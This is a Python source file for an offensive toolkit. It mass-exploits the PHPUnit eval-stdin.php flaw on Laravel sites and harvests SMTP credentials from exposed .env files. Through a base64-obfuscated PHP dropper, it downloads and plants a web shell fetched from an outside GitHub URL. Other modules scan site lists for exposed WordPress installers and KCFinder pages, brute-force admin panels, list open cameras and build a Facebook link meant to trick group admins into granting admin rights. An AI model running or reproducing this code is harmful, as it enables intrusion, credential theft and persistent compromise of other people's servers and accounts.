import requests
from threading import Thread
import random
import os
requests.packages.urllib3.disable_warnings()
import threading, time, random
from threading import *
from queue import Queue
import sys, re, time




###########################
#####################
class random_camera_hack():
	
	def __init__(self):
		self.header = {"User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0"}
		print("{}1{}-{}Search By Country".format("\033[1;32m","\033[1;33m","\033[1;36m"))
		print("{}2{}-{}Search By Places".format("\033[1;32m","\033[1;33m","\033[1;36m"))
		option=int(input("Select >> "))
		if option == 1: self.search_by_contry()
		elif option ==2: self.search_by_bytag()

		


	def search_by_bytag(self):
		self.Minu_Search_By_Tags()
		self.places=[
		"Advertisement","Airliner","Animal",

		"Architecture","Bar","Barbershop","Beach","Bridge",

		"City","Coffeehouse","Computer","Construction","Education",

		"Energy","Entertainment","Farm","Guess","Hotel","House","Hq",

		"Industrial","Interesting","Kitchen","Lake","Landscape","Laundry","Mall",

		"Marina","Mountain","Nature","Office","Park","Parking","Pool","Printer",

		"Ptz","Religion","Restaurant","River",

		"Road","Server","Service","Shop","Sport","Square","Street",

		"Surfing","Traffic","Tv","Village","Warehouse","Weather"]
		self.choice2=int(input("Select Num >> "))
		self.selected1=self.places[self.choice2-1]
		self.url_by_places="https://www.insecam.org/en/bytag/{}".format(self.selected1)
		self.req1=requests.get(self.url_by_places, headers=self.header)
		self.final_page1=re.findall('pagenavigator\("\?page=", (\d+)', self.req1.text)[0]
		for page in range(int(self.final_page1)):
			self.req1 = requests.get("https://www.insecam.org/en/bytag/{}/?page={}".format(self.selected1,page),headers=self.header)
			search_ip = re.findall("http://\d+.\d+.\d+.\d+:\d+", self.req1.text)
			for ip in search_ip:
				print("\033[1;33m[\033[1;36mCam-Founded\033[1;33m]  \033[1;32m"+ip)

	def search_by_contry(self):

		self.Minu_Search_By_Country()
		self.countries = ["US", "JP", "IT", "KR", "FR", "DE", "TW", "RU", "GB", "NL",
				"CZ", "TR", "AT", "CH", "ES", "CA", "SE", "IL", "PL", "IR",
				"NO", "RO", "IN", "VN", "BE", "BR", "BG", "ID", "DK", "AR",
				"MX", "FI", "CN", "CL", "ZA", "SK", "HU", "IE", "EG", "TH",
				"UA", "RS", "HK", "GR", "PT", "LV", "SG", "IS", "MY", "CO",
				"TN", "EE", "DO", "SI", "EC", "LT", "PS", "NZ", "BD", "PA",
				"MD", "NI", "MT", "IT", "SA", "HR", "CY", "PK", "AE", "KZ",
				"KW", "VE", "GE", "ME", "SV", "LU", "CW", "PR", "CR", "BY",
				"AL", "LI", "BA", "PY", "PH", "FO", "GT", "NP", "PE", "UY",
				"-"]
		
		
		self.choice=int(input("Select Num >> "))
		self.selected=self.countries[self.choice-1]
		self.url="https://www.insecam.org/en/bycountry/{}".format(self.selected)
		self.req=requests.get(self.url,headers=self.header)
		self.final_page=re.findall('pagenavigator\("\?page=", (\d+)', self.req.text)[0]
		for page in range(int(self.final_page)):
			self.req = requests.get("https://www.insecam.org/en/bycountry/{}/?page={}".format(self.selected,page),headers=self.header)
			search_ip = re.findall("http://\d+.\d+.\d+.\d+:\d+", self.req.text)
			for ip in search_ip:
				print("\033[1;33m[\033[1;36mCam-Founded\033[1;33m]  \033[1;32m"+ip)

		


	def Minu_Search_By_Country(self):

		print("""
\033[1;36m[1] \033[1;37mUnited States                \033[1;36m[31] \033[1;37mMexico                \033[1;36m[61] \033[1;37mMoldova
\033[1;36m[2] \033[1;37mJapan                        \033[1;36m[32] \033[1;37mFinland               \033[1;36m[62] \033[1;37mNicaragua
\033[1;36m[3] \033[1;37mItaly                        \033[1;36m[33] \033[1;37mChina                 \033[1;36m[63] \033[1;37mMalta
\033[1;36m[4] \033[1;37mKorea                        \033[1;36m[34] \033[1;37mChile                 \033[1;36m[64] \033[1;37mTrinidad And Tobago
\033[1;36m[5] \033[1;37mFrance                       \033[1;36m[35] \033[1;37mSouth Africa          \033[1;36m[65] \033[1;37mSoudi Arabia
\033[1;36m[6] \033[1;37mGermany                      \033[1;36m[36] \033[1;37mSlovakia              \033[1;36m[66] \033[1;37mCroatia
\033[1;36m[7] \033[1;37mTaiwan                       \033[1;36m[37] \033[1;37mHungary               \033[1;36m[67] \033[1;37mCyprus
\033[1;36m[8] \033[1;37mRussian Federation           \033[1;36m[38] \033[1;37mIreland               \033[1;36m[68] \033[1;37mPakistan
\033[1;36m[9] \033[1;37mUnited Kingdom               \033[1;36m[39] \033[1;37mEgypt                 \033[1;36m[69] \033[1;37mUnited Arab Emirates
\033[1;36m[10] \033[1;37mNetherlands                 \033[1;36m[40] \033[1;37mThailand              \033[1;36m[70] \033[1;37mKazakhstan
\033[1;36m[11] \033[1;37mCzech Republic              \033[1;36m[41] \033[1;37mUkraine               \033[1;36m[71] \033[1;37mKuwait
\033[1;36m[12] \033[1;37mTurkey                      \033[1;36m[42] \033[1;37mSerbia                \033[1;36m[72] \033[1;37mVenezuela
\033[1;36m[13] \033[1;37mAustria                     \033[1;36m[43] \033[1;37mHong Kong             \033[1;36m[73] \033[1;37mGeorgia
\033[1;36m[14] \033[1;37mSwitzerland                 \033[1;36m[44] \033[1;37mGreece                \033[1;36m[74] \033[1;37mMontenegro
\033[1;36m[15] \033[1;37mSpain                       \033[1;36m[45] \033[1;37mPortugal              \033[1;36m[75] \033[1;37mEl Salvador
\033[1;36m[16] \033[1;37mCanada                      \033[1;36m[46] \033[1;37mLatvia                \033[1;36m[76] \033[1;37mLuxembourg
\033[1;36m[17] \033[1;37mSweden                      \033[1;36m[47] \033[1;37mSingapore             \033[1;36m[77] \033[1;37mCuracao
\033[1;36m[18] \033[1;37mIsrael                      \033[1;36m[48] \033[1;37mIceland               \033[1;36m[78] \033[1;37mPuerto Rico
\033[1;36m[19] \033[1;37mIran                        \033[1;36m[49] \033[1;37mMalaysia              \033[1;36m[79] \033[1;37mCosta Rica
\033[1;36m[20] \033[1;37mPoland                      \033[1;36m[50] \033[1;37mColombia              \033[1;36m[80] \033[1;37mBelarus
\033[1;36m[21] \033[1;37mIndia                       \033[1;36m[51] \033[1;37mTunisia               \033[1;36m[81] \033[1;37mAlbania
\033[1;36m[22] \033[1;37mNorway                      \033[1;36m[52] \033[1;37mEstonia               \033[1;36m[82] \033[1;37mLiechtenstein
\033[1;36m[23] \033[1;37mRomania                     \033[1;36m[53] \033[1;37mDominican Republic    \033[1;36m[83] \033[1;37mBosnia And Herzegovia
\033[1;36m[24] \033[1;37mViet Nam                    \033[1;36m[54] \033[1;37mSloveania             \033[1;36m[84] \033[1;37mParaguay
\033[1;36m[25] \033[1;37mBelgium                     \033[1;36m[55] \033[1;37mEcuador               \033[1;36m[85] \033[1;37mPhilippines
\033[1;36m[26] \033[1;37mBrazil                      \033[1;36m[56] \033[1;37mLithuania             \033[1;36m[86] \033[1;37mFaroe Islands
\033[1;36m[27] \033[1;37mBulgaria                    \033[1;36m[57] \033[1;37mPalestinian           \033[1;36m[87] \033[1;37mGuatemala
\033[1;36m[28] \033[1;37mIndonesia                   \033[1;36m[58] \033[1;37mNew Zealand           \033[1;36m[88] \033[1;37mNepal
\033[1;36m[29] \033[1;37mDenmark                     \033[1;36m[59] \033[1;37mBangladeh             \033[1;36m[89] \033[1;37mPeru
\033[1;36m[30] \033[1;37mArgentina                   \033[1;36m[60] \033[1;37mPanama                \033[1;36m[90] \033[1;37mUruguay""")
#########################################################################
#########################################################################


	def Minu_Search_By_Tags(self):
		print("""
\033[1;36m[1] \033[1;37mAdvertisement              \033[1;36m[31] \033[1;37mLandscape               \033[1;36m[61] \033[1;37mTv
\033[1;36m[2] \033[1;37mAirliner                   \033[1;36m[32] \033[1;37mLaundry                 \033[1;36m[62] \033[1;37mVillage
\033[1;36m[3] \033[1;37mAnimal                     \033[1;36m[33] \033[1;37mMall                    \033[1;36m[63] \033[1;37mWarehouse
\033[1;36m[4] \033[1;37mArchitecture               \033[1;36m[34] \033[1;37mMarina                  \033[1;36m[64] \033[1;37mWeather
\033[1;36m[5] \033[1;37mBar                        \033[1;36m[35] \033[1;37mMountain
\033[1;36m[6] \033[1;37mBarbershop                 \033[1;36m[36] \033[1;37mNature
\033[1;36m[7] \033[1;37mBeach                      \033[1;36m[37] \033[1;37mOffice
\033[1;36m[8] \033[1;37mBridge           	       \033[1;36m[38] \033[1;37mPark
\033[1;36m[9] \033[1;37mCity               	       \033[1;36m[39] \033[1;37mParking
\033[1;36m[10] \033[1;37mCoffeehouse               \033[1;36m[40] \033[1;37mPool
\033[1;36m[11] \033[1;37mComputer              	   \033[1;36m[41] \033[1;37mPrinter
\033[1;36m[12] \033[1;37mConstruction              \033[1;36m[42] \033[1;37mPtz
\033[1;36m[13] \033[1;37mEducation                 \033[1;36m[43] \033[1;37mReligion
\033[1;36m[14] \033[1;37mEnergy                	   \033[1;36m[44] \033[1;37mRestaurant
\033[1;36m[15] \033[1;37mEntertainment                     \033[1;36m[45] \033[1;37mRiver
\033[1;36m[16] \033[1;37mFarm                    \033[1;36m[46] \033[1;37mRoad
\033[1;36m[17] \033[1;37mGuess                    \033[1;36m[47] \033[1;37mServer
\033[1;36m[18] \033[1;37mHotel                    \033[1;36m[48] \033[1;37mService
\033[1;36m[19] \033[1;37mHouse                      \033[1;36m[49] \033[1;37mShop
\033[1;36m[20] \033[1;37mHq                    \033[1;36m[50] \033[1;37mSport
\033[1;36m[21] \033[1;37mIndustrial                     \033[1;36m[51] \033[1;37mSquare    
\033[1;36m[22] \033[1;37mInteresting                    \033[1;36m[52] \033[1;37mStreet  
\033[1;36m[23] \033[1;37mKitchen                   \033[1;36m[53] \033[1;37mSurfing
\033[1;36m[24] \033[1;37mLake                  \033[1;36m[54] \033[1;37mTraffic
			""")
		



###########################
########################
class wp_install():
	def __init__(self):
		self.screenlock_wp=Semaphore(value=1)
		self.vulnerable=0
		self.bad=0
		self.exploit_path="/wordpress/wp-admin/install.php"
		self.job_wp=Queue()
		self.read_path=input("Enter Weblist Path: ")
		self.threads=int(input("Enter Num Threads: "))
		self.read_file=open(self.read_path, "r").read().splitlines()
		for i in self.read_file:
			self.job_wp.put(i)

		for work in range(self.threads):
			th5=Thread(target=self.fuck_you_wp, args=(self.job_wp,))
			th5.start()
		self.job_wp.join()
	def fuck_you_wp(self,q):
		while not q.empty():
			i=q.get()
			if i.startswith("http"):
				self.url= i+self.exploit_path
				self.exploit_wp(self.url)
			else:
				self.url="http://"+i+self.exploit_path
				self.exploit_wp(self.url)
			q.task_done()

	def exploit_wp(self, url):
		try:
			self.wp_brute=requests.get(url,timeout=15, verify=False).status_code
			if self.wp_brute == 200:
				self.screenlock_wp.acquire()
				print("\033[1;33m[\033[1;36mFound-Vuln\033[1;33m]  \033[1;32m"+url)
				self.screenlock_wp.release()
				self.vulnerable=self.vulnerable+1
			else:
				self.screenlock_wp.acquire()
				print("\033[1;33m[\033[1;36mBad\033[1;33m]  \033[1;31m "+url)
				self.screenlock_wp.release()
				self.bad=self.bad+1
		except Exception:
			self.screenlock_wp.acquire()
			print("\033[1;33m[\033[1;36mBad\033[1;33m]  \033[1;31m "+url)
			self.screenlock_wp.release()
			self.bad=self.bad+1			




###########################
###########################

class kc_finder():
	def __init__(self):
		self.screenlock_kc=Semaphore(value=1)
		self.bad=0
		self.vulnerable=0
		self.exploit_path="/webboard/plugins/editors/kcfinder/browse.php"
		self.job_kc=Queue()
		self.list_path=input("Enter Website List: ")
		self.threads=int(input("How Many Threads You Want: "))
		self.read_list_site=open(self.list_path, "r").read().splitlines()
		for i in self.read_list_site:
			self.job_kc.put(i)
		for work in range(self.threads):
			th2=Thread(target=self.fuck_you_kc_finder, args=(self.job_kc,))
			th2.start()
		self.job_kc.join()
		print('''               
\033[1;36m---------\033[1;32mResult\033[1;36m---------
\033[1;34mExploitable\033[1;33m: \033[1;32m{}
\033[1;37mBad\033[1;33m: \033[1;31m{}
\033[1;36m------------------------


'''.format(self.vulnerable,self.bad))

	def kc_finder_exploit(self, url):
		try:
			self.kc_brute=requests.get(url,timeout=15, verify=False).status_code
			if self.kc_brute == 200:
				self.screenlock_kc.acquire()
				print("\033[1;33m[\033[1;36mFound-Vuln\033[1;33m]  \033[1;32m"+url)
				self.screenlock_kc.release()
				self.vulnerable=self.vulnerable+1
			else:
				self.screenlock_kc.acquire()
				print("\033[1;33m[\033[1;36mBad\033[1;33m]  \033[1;31m "+url)
				self.screenlock_kc.release()
				self.bad=self.bad+1
		except Exception:
			self.screenlock_kc.acquire()
			print("\033[1;33m[\033[1;36mBad\033[1;33m]  \033[1;31m "+url)
			self.screenlock_kc.release()
			self.bad=self.bad+1			

	def fuck_you_kc_finder(self,q):
		while not q.empty():
			i=q.get()
			if i.startswith("http"):
				self.url= i+self.exploit_path
				self.kc_finder_exploit(self.url)
			else:
				self.url="http://"+i+self.exploit_path
				self.kc_finder_exploit(self.url)
			q.task_done()







#################
#######################
screenlock = Semaphore(value=1)


############################
smtp=0
shell=0
vulnerable=0
bad = 0
#########################
class lavarel_vunl():

	def __init__(self):
		self.exploit_shell_url="/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
		self.smtp_and_info_url="/.env"
		self.check_vunl_data="<?php phpinfo(); ?>"

		##########checking
		
		self.jobs=Queue()
		self.list=input("Enter WebSite List: ")
		threads=int(input("How Many Threads: "))
		try:
			read_file=open(self.list,'r').read().splitlines()
		except FileNotFoundError:
			print("\033[1;33m[\033[1;36mSys_Error\033[1;33m]\033[1;31m {} is not exist..!".format(self.list))
			exit()
		for dla3 in read_file:
			self.jobs.put(dla3)

		for i in range(threads):
			bots=threading.Thread(target=self.algeria_hhhh, args=(self.jobs,))
			bots.start()
		self.jobs.join()
									#{}
		print('''               
\033[1;36m---------\033[1;32mResult\033[1;36m---------
\033[1;36mSMTP\033[1;33m: \033[1;32m{}
\033[1;35mShells Uploaded\033[1;33m: \033[1;32m{}
\033[1;34mExploited\033[1;33m: \033[1;32m{}
\033[1;37mBad\033[1;33m: \033[1;31m{}
\033[1;36m------------------------


'''.format(smtp,shell,vulnerable, bad))



	def give_me_the_smtp(self,url):
		global smtp
		year=time.localtime()[0]
		mounth=time.localtime()[1]
		day=time.localtime()[2]
		hour=time.localtime()[3]
		mins=time.localtime()[4]
		sec=time.localtime()[5]
		verdino=self.url.replace("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/.env")
		try:
			_9or9a3=requests.get(verdino, timeout=15, verify=False).text
			if "MAIL_HOST" in _9or9a3 and "MAIL_USERNAME" in _9or9a3:

				DNS_host=re.findall("\nMAIL_HOST=(.*?)\n", _9or9a3)[0]
				port_smtp=re.findall("\nMAIL_PORT=(.*?)\n", _9or9a3)[0]
				username_smtp=re.findall("\nMAIL_USERNAME=(.*?)\n", _9or9a3)[0]
				password_smtp=re.findall("\nMAIL_PASSWORD=(.*?)\n", _9or9a3)[0]
				if username_smtp == "null" or password_smtp == "null" or username_smtp == "" or password_smtp == "":
					pass
				if "mailtrap" in username_smtp:
					pass
				else:
					screenlock.acquire()
					print("\033[1;33m[\033[1;36mFound-SMTP\033[1;33m]  \033[1;32m"+verdino)
					smtp=smtp+1
					smtp_file=open("Result/smtp.txt", "a")
					_9irch = verdino.replace(".env","")
					save_the_mnanok = _9irch+" [Host:"+DNS_host+" Port:"+port_smtp+" Username:"+username_smtp+" Password: "+password_smtp+" ]"
					smtp_file.write(save_the_mnanok+"\n")
					smtp_file.close()
					file_all_env=open("Result/{}:{}-{}-{}:{}-{}-{}.txt".format(DNS_host,year,mounth,day,hour,mins,sec), "a")
					file_all_env.write(_9or9a3)
					screenlock.release()


		except KeyboardInterrupt:
			print("Good Bey")
			exit()
		except:
			pass
	










	def exploit_shell(self,url):
		self.give_me_the_smtp(url)
		global vulnerable
		global shell
		global bad


		try:
			self.check_vunl_shell=requests.get(url,data=self.check_vunl_data, timeout=15, verify=False)
			if "phpinfo" in self.check_vunl_shell.text:
				screenlock.acquire()
				print("\033[1;33m[\033[1;36mFound-Vuln\033[1;33m]  \033[1;32m"+url)
				screenlock.release()
				vulnerable=vulnerable+1
				vuln_file=open("Result/vuln.txt", "a")
				vuln_file.write(url+"\n")
				vuln_file.close()
				shell_file="<?php eval('?>'.base64_decode('PD9waHANCmZ1bmN0aW9uIGFkbWluZXIoJHVybCwgJGlzaSkgew0KCSRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7DQoJJGNoID0gY3VybF9pbml0KCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0JJTkFSWVRSQU5TRkVSLCB0cnVlKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GSUxFLCAkZnApOw0KCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsNCgljdXJsX2Nsb3NlKCRjaCk7DQoJZmNsb3NlKCRmcCk7DQoJb2JfZmx1c2goKTsNCglmbHVzaCgpOw0KfQ0KaWYoYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h5b3Vlei9MaW51eFNlYy9tYXN0ZXIvYmF5LnBocCIsInNoM2xsLnBocCIpKSB7DQoJZWNobyAiU3Vrc2VzIjsNCn0gZWxzZSB7DQoJZWNobyAiZmFpbCI7DQp9DQo/Pg==')); ?>"
				upload_shell=requests.get(url,data=shell_file, timeout=15, verify=False)
				if "Sukses" in upload_shell.text:
					screenlock.acquire()
					print("\033[1;33m[\033[1;36mSpawned\033[1;33m]  \033[1;32mShell was Uploaded Successfully")
					screenlock.release()
					shell=shell+1
					shell_rezult=open("Result/shells.txt", "a")
					pathshell = url.replace("eval-stdin.php","sh3ll.php")
					shell_rezult.write(pathshell+"\n")
					shell_rezult.close()
				else:
					screenlock.acquire()
					print("\033[1;33m[\033[1;36mFail\033[1;33m]  \033[1;31mFail Upload Shell")
					screenlock.release()
			else:
				screenlock.acquire()
				print("\033[1;33m[\033[1;36mBad\033[1;33m]  \033[1;31m "+url)
				screenlock.release()
				bad = bad + 1
		except KeyboardInterrupt:
			print("Good Bey")
			exit()
		except Exception as err:
			screenlock.acquire()
			print("\033[1;33m[\033[1;36mBad\033[1;33m]  \033[1;31m "+url)
			screenlock.release()
			bad = bad + 1
	def algeria_hhhh(self,q):
		while not q.empty():
			i=q.get()
			if i.startswith("http"):
				self.url= i+self.exploit_shell_url
				self.exploit_shell(self.url)
			else:
				self.url="http://"+i+self.exploit_shell_url
				self.exploit_shell(self.url)
			q.task_done()


#######################"
#################
class admin_brute_forcing():
	def __init__(self):
		self.screenlock_br=Semaphore(value=1)
		self.wordlist_path=["BruteFiles/admin_wordlist/big.txt","BruteFiles/admin_wordlist/medium.txt", "BruteFiles/admin_wordlist/small.txt"]
		###############
		self.target=input("Enter The URL: ")
		self.wordlist=int(input("Enter Wordlist Num: "))
		if self.wordlist == 1:
			self.Read_File=open(self.wordlist_path[2], "r").read().splitlines()
		elif self.wordlist ==2:
			self.Read_File=open(self.wordlist_path[1], "r").read().splitlines()
		elif self.wordlist ==3:
			self.Read_File=open(self.wordlist_path[0], "r").read().splitlines()
		self.job_th=Queue()

		for i in self.Read_File:
			self.job_th.put(i)
		
		for work in range(100):
			th2=Thread(target=self.fuck_you_admin_panel, args=(self.job_th,))
			th2.start()
		self.job_th.join()
	
	def fuck_you_admin_panel(self,q):
		while not q.empty():
			i=q.get()
			if self.target.startswith("http" or "https"):
				self.url= self.target+i
				self.brute(self.url)
			else:
				print("Erro In URL")
			q.task_done()
		

	def brute(self,url):
		try:
			self.ask=requests.get(url, timeout=15, verify=False).status_code
			if self.ask == 200:
				self.screenlock_br.acquire()
				print("Page Found: {}".format(url))
				self.screenlock_br.release()
			else:
				self.screenlock_br.acquire()
				print("Page Not Found: {}".format(url))
				self.screenlock_br.release()
		except Exception:
			self.screenlock_br.acquire()
			print("Page Not Found: {}".format(url))
			self.screenlock_br.release()			



		

		














########################
###########################
def retur():
	finele=input("\033[1;36mDo you to return to the main page ? \033[1;34m(yes) \033[1;36mor \033[1;34m(no)\033[1;33m: \033[1;32m")
	if finele == "yes":
		main()



class group_hack():
	def __init__(self):
		self.group_ID=input("\033[1;36mEnter Group ID\033[1;33m: \033[1;32m")
		self.mY_ID=input("Enter Your ID: ")
		self.link="https://m.facebook.com/group/add_admin/?group_id={}&user_id={}&added&_rdrChange".format(self.group_ID, self.mY_ID)
		print("\033[1;36mLink \033[1;33m>> \033[1;32m{}".format(self.link))
		print("\033[1;33mCopy The Link and Send it to The Admin")
class IP_Tracker():
	def __init__(self):

		self.logo()
		self.ip=input("\033[1;36mEnter IP or DNS: \033[1;32m\033[0;37m")
		print("\033[1;33mPlease Wait Until we Collect Data...\033[0;37m")
		#http://www.ip-api.com/json/nostal.co.il?fields=66846719
		self.url="http://www.ip-api.com/json/{}?fields=66846719".format(self.ip)
		try:
			req=requests.get(self.url).json()
			#print(req)
			status=req['status']
			if status == "success":
				IP=req['query']
				continent=req['continent']
				continentCode=req['continentCode']
				country=req['country']
				countryCode=req['countryCode']
				region=req['region']
				regionName=req['regionName']
				city=req['city']
				zipzip=req['zip']
				lat=req['lat']
				lon=req['lon']
				timezone=req['timezone']
				currency=req['currency']
				isp=req['isp']
				org=req['org']
				ass=req['as']
				hosting=req['hosting']
				self.Longtitude=float(req['lat'])
				self.Latitude=float(req['lon'])
				GoogleMap='http://www.google.com/maps/place/{0},{1}/@{0},{1},16z'.format(self.Latitude, self.Longtitude)
				raport='''
\033[1;33mIP\033[1;36m: \033[1;32m{}
\033[1;33mASN\033[1;36m: \033[1;32m{}
\033[1;33mCity\033[1;36m: \033[1;32m{}
\033[1;33mCountry\033[1;36m: \033[1;32m{}
\033[1;33mCountry Code\033[1;36m: \033[1;32m{}
\033[1;33mISP\033[1;36m: \033[1;32m{}
\033[1;33mLatitude\033[1;36m: \033[1;32m{}
\033[1;33mLongtitude\033[1;36m: \033[1;32m{}
\033[1;33mOrganization\033[1;36m: \033[1;32m{}
\033[1;33mRegion Code\033[1;36m: \033[1;32m{}
\033[1;33mRegion Name\033[1;36m: \033[1;32m{}
\033[1;33mTimezone\033[1;36m: \033[1;32m{}
\033[1;33mZip Code\033[1;36m: \033[1;32m{}
\033[1;33mHosting\033[1;36m: \033[1;32m{}
\033[1;33mGoogle Map\033[1;36m: \033[1;32m{}\033[0;37m'''.format(IP,ass,city,country,countryCode,isp,lat,lon,org,region,regionName,timezone,zipzip,hosting,GoogleMap)
				print(raport)
				raport2='''
IP: {}
ASN: {}
City: {}
Country: {}
Country Code: {}
ISP: {}
Latitude: {}
Longtitude: {}
Organization: {}
Region Code: {}
Region Name: {}
Timezone: {}
Zip Code: {}
Hosting: {}
Google Map: {}'''.format(IP,ass,city,country,countryCode,isp,lat,lon,org,region,regionName,timezone,zipzip,hosting,GoogleMap)
				choise=input("\033[1;36mDo you want to save results (\033[1;35myes\033[1;36m)\033[1;35m\033[1;36m or \033[1;36m(\033[1;35mno\033[1;36m): ")
				if choise == "yes":
					name_file=input("Name of the File: ")
					the_file=open("Result/Raports/{}.txt".format(name_file), "w")
					the_file.write(raport2)
					print("\033[1;33mThe File was Successfully Saved..!\033[0;37m")
				else:
					pass

			else:
				print("\033[1;33mSet IP or DNS is Incorrect...?!\033[0;37m")
		except requests.exceptions.ConnectionError:
			print("\033[1;33mThere is no internet Connection..!\033[0;37m")

	def logo(self):
		os.system("clear")
		logo='''
\033[0;31m██╗██████╗    ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
\033[0;31m██║██╔══██╗   ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
\033[0;31m██║██████╔╝█████╗██║   ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
\033[0;31m██║██╔═══╝ ╚════╝██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
\033[0;31m██║██║           ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
\033[0;31m╚═╝╚═╝           ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                 \033[0;36mby cyberpunk645\033[0;37m'''
		print(logo)







class sqli_brute_and_scan():
	def scan_url_sqli(self):
			url=input("Type URL here: ")
			zzz="{}%27".format(url)
			req=requests.get(zzz).status_code
			if req == 200:
				print("SQL Injection Found")
			else:
				print("SQL iNJECTION NOT FOUND")

	#Soon
	def brute_sites_sqli(self):
		pass












class main(Thread):
	def __init__(self):
		os.system("clear")
		self.logo()
		print("{}1{}-{}SQL Injection Brute Forcing".format("\033[1;32m","\033[1;33m","\033[1;36m"))
		print("{}2{}-{}Admin Panel Brute Forcing".format("\033[1;32m","\033[1;33m","\033[1;36m"))
		print("{}3{}-{}SQL Injection Scan URL".format("\033[1;32m","\033[1;33m","\033[1;36m"))
		print("{}4{}-{}Facebook Group Hack".format("\033[1;32m","\033[1;33m","\033[1;36m"))
		print("{}5{}-{}IP-Tracker".format("\033[1;32m","\033[1;33m","\033[1;36m"))
		print("{}6{}-{}Wp-Install Bruter".format("\033[1;32m","\033[1;33m","\033[1;36m"))
		print("{}7{}-{}Lavarel SMTP Dumper And Shell Uploader".format("\033[1;32m","\033[1;33m","\033[1;36m"))
		print("{}8{}-{}kc Finder".format("\033[1;32m","\033[1;33m","\033[1;36m"))
		print("{}9{}-{}Random Cam Hacking".format("\033[1;32m","\033[1;33m","\033[1;36m"))
		choise=int(input("\033[1;33m[\033[1;34m*\033[1;33m]\033[1;33mSelect Number 1 to 9: \033[1;32m"))

		if choise == 1:
			#sqli_brute_and_scan().brute_sites_sqli()
			retur()
		elif choise == 2:
			admin_brute_forcing()
			retur()
		elif choise == 3:
			#sqli_brute_and_scan().scan_url_sqli()
			retur()
		elif choise ==5:
			IP_Tracker()
			retur()
		elif choise ==6:
			wp_install()
		elif choise ==4:
			group_hack()
			retur()
		elif choise ==7:
			lavarel_vunl()
			retur()
		elif choise == 8:
			kc_finder()
		elif choise ==9:
			random_camera_hack()
			retur()







	def logo(self):
		print('''\033[1;33m
                 @@@
                  @@@
                   @@@                        \033[0;36mC Y B E R\033[1;33m   
                   @@@
           @@@@@@@@@@@@@@@@@@@@@@           \033[0;36mS C A N N E R\033[1;33m
         @@@@@@@@@@@@@@@@@@@@@@@@@@
         @@  Version: 0.1Beta    @@
       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@
   @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@
 @@@@@@@@@@  \033[1;31m*  \033[1;33m@@@@@@@@@@@@  \033[1;31m*  \033[1;33m@@@@@@@@@@
@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@
 @@@@@@@@  \033[1;31m@@ @@ @@ @@ @@ @@ @@ @\033[1;33m  @@@@@@@@
   @@@@@@@                        @@@@@@@
     @@@@@@  \033[1;31m@@ @@ @@ @@ @@ @@ @\033[1;33m @@@@@@
       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
         @@@@@@@@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@
''')

th=Thread(target=main)
th.start()
